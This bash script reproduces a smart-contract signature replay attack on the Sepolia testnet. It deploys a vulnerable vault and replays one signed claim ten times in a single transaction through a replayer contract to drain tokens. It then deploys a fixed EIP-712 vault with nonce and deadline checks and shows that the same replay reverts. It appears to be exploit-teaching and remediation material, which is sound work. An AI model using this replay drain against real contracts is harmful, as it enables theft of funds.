#!/usr/bin/env bash
# Reproduce defi19 (Signature Replay) on Sepolia, end to end.
#   export RPC=<your Sepolia RPC>;  export PK=<funded Sepolia key>   # the deployer is the operator/signer
#   ./reproduce.sh
# Values are in wei (x10^18): 100000000000000000000 = 100 RWD.
set -euo pipefail
cd "$(dirname "$0")"
: "${RPC:?set RPC}"; : "${PK:?set PK}"
GP=$(( $(cast gas-price --rpc-url "$RPC") + 3000000000 ))
OP=$(cast wallet address --private-key "$PK")
ALICE=$(cast wallet address --private-key 0x0000000000000000000000000000000000000000000000000000000000000002)
ATTACKER=$(cast wallet address --private-key 0x0000000000000000000000000000000000000000000000000000000000000003)
AMT=100000000000000000000     # 100e18
tx(){ cast send "$@" --rpc-url "$RPC" --private-key "$PK" --legacy --gas-price "$GP" --json \
      | python3 -c "import sys,json;print(json.load(sys.stdin)['transactionHash'])"; }
bal(){ cast call "$1" "balanceOf(address)(uint256)" "$2" --rpc-url "$RPC"; }

# personal_sign over keccak256(abi.encodePacked(to, amount)) — what the VULNERABLE vault verifies
sig_vuln(){ local to=${1#0x}; local amt; amt=$(cast to-uint256 "$2"); amt=${amt#0x}
  cast wallet sign --private-key "$PK" "$(cast keccak "0x${to}${amt}")"; }

echo "############ ACT 1 + 2 : VULNERABLE vault ############"
forge script script/SigReplaySepolia.s.sol:SigReplaySepolia --rpc-url "$RPC" --private-key "$PK" --broadcast --legacy --gas-price "$GP" >/tmp/d19.log 2>&1
TOKEN=$(grep -oE 'TOKEN=0x[0-9a-fA-F]{40}' /tmp/d19.log|head -1|cut -d= -f2)
VAULT=$(grep -oE 'VAULT=0x[0-9a-fA-F]{40}' /tmp/d19.log|head -1|cut -d= -f2)
REPLAYER=$(grep -oE 'REPLAYER=0x[0-9a-fA-F]{40}' /tmp/d19.log|head -1|cut -d= -f2)
echo "TOKEN=$TOKEN"; echo "VAULT=$VAULT"; echo "REPLAYER=$REPLAYER"; echo "OPERATOR=$OP"; echo "ALICE=$ALICE"; echo "ATTACKER=$ATTACKER"
echo "--- pot before ---"; bal "$TOKEN" "$VAULT"

echo "--- ACT 1 HONEST: operator signs (Alice,100); Alice claims ONCE ---"
SIG_A=$(sig_vuln "$ALICE" "$AMT")
echo "HONEST_CLAIM_TX=$(tx "$VAULT" 'claim(address,uint256,bytes)' "$ALICE" "$AMT" "$SIG_A")"
echo "alice balance:"; bal "$TOKEN" "$ALICE"

echo "--- ACT 2 ATTACK: operator signs ONE (attacker,100); REPLAY it 10x in one atomic tx ---"
SIG_B=$(sig_vuln "$ATTACKER" "$AMT")
echo "DRAIN_TX=$(tx "$REPLAYER" 'drain(address,address,uint256,bytes,uint256)' "$VAULT" "$ATTACKER" "$AMT" "$SIG_B" 10)"
echo "attacker balance (expect 1000):"; bal "$TOKEN" "$ATTACKER"
echo "vault pot left (expect 99000):"; bal "$TOKEN" "$VAULT"

echo "############ ACT 3 : FIXED vault (EIP-712 + nonce + deadline + used) ############"
forge script script/SigReplayFixedSepolia.s.sol:SigReplayFixedSepolia --rpc-url "$RPC" --private-key "$PK" --broadcast --legacy --gas-price "$GP" >/tmp/d19f.log 2>&1
FTOKEN=$(grep -oE 'TOKEN=0x[0-9a-fA-F]{40}' /tmp/d19f.log|head -1|cut -d= -f2)
FVAULT=$(grep -oE 'VAULT=0x[0-9a-fA-F]{40}' /tmp/d19f.log|head -1|cut -d= -f2)
echo "FTOKEN=$FTOKEN"; echo "FVAULT=$FVAULT"
DOMAIN=$(cast call "$FVAULT" "DOMAIN_SEPARATOR()(bytes32)" --rpc-url "$RPC")
NONCE=1; DEADLINE=$(( $(date +%s) + 3600 ))
TYPEHASH=$(cast keccak "Claim(address to,uint256 amount,uint256 nonce,uint256 deadline)")
STRUCT=$(cast keccak "$(cast abi-encode 'f(bytes32,address,uint256,uint256,uint256)' "$TYPEHASH" "$ATTACKER" "$AMT" "$NONCE" "$DEADLINE")")
DIGEST=$(cast keccak "$(cast concat-hex 0x1901 "$DOMAIN" "$STRUCT")")
SIG_F=$(cast wallet sign --no-hash --private-key "$PK" "$DIGEST")
echo "--- ACT 3 FIXED: first claim SUCCEEDS (pays the one authorized 100) ---"
echo "FIXED_CLAIM_TX=$(tx "$FVAULT" 'claim(address,uint256,uint256,uint256,bytes)' "$ATTACKER" "$AMT" "$NONCE" "$DEADLINE" "$SIG_F")"
echo "attacker balance (expect 100):"; bal "$FTOKEN" "$ATTACKER"
echo "--- replay the SAME signature -> must REVERT 'used' ---"
set +e
cast send "$FVAULT" 'claim(address,uint256,uint256,uint256,bytes)' "$ATTACKER" "$AMT" "$NONCE" "$DEADLINE" "$SIG_F" --rpc-url "$RPC" --private-key "$PK" --legacy --gas-price "$GP" 2>/tmp/d19rev.txt
echo "replay result:"; tail -3 /tmp/d19rev.txt
set -e
echo "attacker balance still (expect 100):"; bal "$FTOKEN" "$ATTACKER"
echo "############ DONE ############"
